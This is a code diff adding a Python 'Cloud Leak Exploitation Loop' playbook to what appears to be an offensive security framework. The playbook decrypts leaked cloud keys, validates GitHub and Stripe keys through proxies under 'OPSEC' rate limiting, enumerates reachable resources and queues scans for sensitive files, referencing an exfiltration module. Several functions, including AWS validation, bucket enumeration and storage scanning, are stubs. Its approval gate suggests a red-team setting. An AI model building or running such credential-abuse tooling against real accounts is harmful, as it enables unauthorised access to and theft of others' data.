@@ -1,0 +1,161 @@
+"""Playbook 2: Cloud Leak Exploitation Loop.
+
+Trigger: key_scanner (Module 2-J) finds a cloud key.
+Steps:
+  1. Auto-Validation — confirm key is active via cloud provider API
+  2. Auto-Enumeration — list accessible resources if key is valid
+  3. Queue-Extraction — scan readable storage for sensitive files
+
+OPSEC: Strict rate limiting. Proxy mandatory for validation calls.
+Checks _SHUTDOWN at top of every step.
+"""
+from __future__ import annotations
+
+import logging
+import sqlite3
+import sys
+from typing import Any, Optional
+
+from forge.opsec.rate_limiter import AdaptiveRateLimiter
+from forge.opsec.resilience import _SHUTDOWN, _interruptible_sleep, wait_for_internet, with_internet_retry
+from forge.phase5.approval_gate import ActionClassification, request_approval
+
+_LOG = logging.getLogger(__name__)
+
+_RATE_LIMITER = AdaptiveRateLimiter(base_delay=2.0, max_delay=30.0, min_delay=2.0)
+
+
+def run_cloud_leak_playbook(
+    engagement_id: int,
+    key_finding_id: int,
+    eng_db_conn: sqlite3.Connection,
+    validation_proxy: Optional[str] = None,
+    dry_run: bool = False,
+) -> dict[str, Any]:
+    """Execute Cloud Leak playbook for a discovered key finding.
+
+    Returns: {'validated': bool, 'resources': list, 'sensitive_files': list}
+    """
+    if _SHUTDOWN.is_set():
+        return _empty_result()
+
+    # Load key finding
+    row = eng_db_conn.execute(
+        "SELECT service, key_enc, validation_state, domain FROM key_scanner_findings WHERE id=? AND engagement_id=?",
+        (key_finding_id, engagement_id),
+    ).fetchone()
+
+    if not row:
+        _LOG.error("Cloud Leak: finding %d not found", key_finding_id)
+        return _empty_result()
+
+    service, key_enc, validation_state, domain = row
+
+    print(f"[CLOUD LEAK] Playbook starting for {service} key in finding {key_finding_id}", flush=True)
+    sys.stdout.flush()
+
+    # --- Step 1: Validation ---
+    if _SHUTDOWN.is_set():
+        return _empty_result()
+
+    if validation_state != "ACTIVE":
+        validated = _validate_key(service, key_enc, validation_proxy)
+        if not validated:
+            print(f"[CLOUD LEAK] Key not active — playbook stopped at validation.", flush=True)
+            return {"validated": False, "resources": [], "sensitive_files": []}
+
+        eng_db_conn.execute(
+            "UPDATE key_scanner_findings SET validation_state='ACTIVE', validated_at=datetime('now') WHERE id=?",
+            (key_finding_id,),
+        )
+        eng_db_conn.commit()
+    else:
+        validated = True
+
+    print(f"[CLOUD LEAK] Step 1 PASS: key validated as ACTIVE", flush=True)
+
+    # --- Step 2: Enumeration ---
+    if _SHUTDOWN.is_set():
+        return {"validated": validated, "resources": [], "sensitive_files": []}
+
+    resources = _enumerate_resources(service, key_enc, validation_proxy, dry_run)
+    print(f"[CLOUD LEAK] Step 2: {len(resources)} resources enumerated", flush=True)
+    sys.stdout.flush()
+
+    # --- Step 3: Sensitive file extraction queue ---
+    if _SHUTDOWN.is_set():
+        return {"validated": validated, "resources": resources, "sensitive_files": []}
+
+    sensitive_files = []
+    for resource in resources:
+        if _SHUTDOWN.is_set():
+            break
+        approved = request_approval(
+            "cloud_file_extraction",
+            f"Scan {resource['name']} for sensitive files",
+            engagement_id,
+            eng_db_conn,
+            ActionClassification.DESTRUCTIVE,
+        )
+        if approved and not dry_run:
+            files = _scan_storage(service, key_enc, resource, validation_proxy)
+            sensitive_files.extend(files)
+            _interruptible_sleep(2.0)
+
+    print(f"[CLOUD LEAK] Step 3: {len(sensitive_files)} sensitive files found", flush=True)
+    sys.stdout.flush()
+
+    return {"validated": validated, "resources": resources, "sensitive_files": sensitive_files}
+
+
+def _validate_key(service: str, key_enc: Optional[str], proxy: Optional[str]) -> bool:
+    if not key_enc:
+        return False
+    if not wait_for_internet():
+        return False
+    _RATE_LIMITER.wait(f"https://validation.{service}.com")
+    try:
+        from forge.opsec.crypto import decrypt_string
+        key = decrypt_string(key_enc)
+    except Exception:
+        return False
+
+    # Service-specific validation
+    if service == "aws":
+        return _validate_aws(key, proxy)
+    if service == "github":
+        from forge.phase2.key_scanner import GithubPatValidator, ValidationState
+        result = GithubPatValidator().validate(key, proxy=proxy)
+        return result.state == ValidationState.ACTIVE
+    if service == "stripe":
+        from forge.phase2.key_scanner import StripeKeyValidator, ValidationState
+        result = StripeKeyValidator().validate(key, proxy=proxy)
+        return result.state == ValidationState.ACTIVE
+    return False
+
+
+def _validate_aws(key: str, proxy: Optional[str]) -> bool:
+    return False  # AWS requires key+secret pair — UNCONFIRMED by default
+
+
+def _enumerate_resources(service: str, key_enc: Optional[str], proxy: Optional[str], dry_run: bool) -> list[dict]:
+    if dry_run:
+        return [{"name": f"[dry-run-{service}-bucket]", "type": "storage"}]
+    if service == "aws":
+        return _enumerate_aws_buckets(key_enc, proxy)
+    if service in ("firebase", "supabase"):
+        return [{"name": f"{service}-project", "type": "database"}]
+    return []
+
+
+def _enumerate_aws_buckets(key_enc: Optional[str], proxy: Optional[str]) -> list[dict]:
+    return []  # requires boto3 or signed requests — stub
+
+
+def _scan_storage(service: str, key_enc: Optional[str], resource: dict, proxy: Optional[str]) -> list[str]:
+    from forge.phase5.exfiltration import PRIORITY_PATTERNS
+    return []  # stub — real impl fetches file listing and matches PRIORITY_PATTERNS
+
+
+def _empty_result() -> dict[str, Any]:
+    return {"validated": False, "resources": [], "sensitive_files": []}
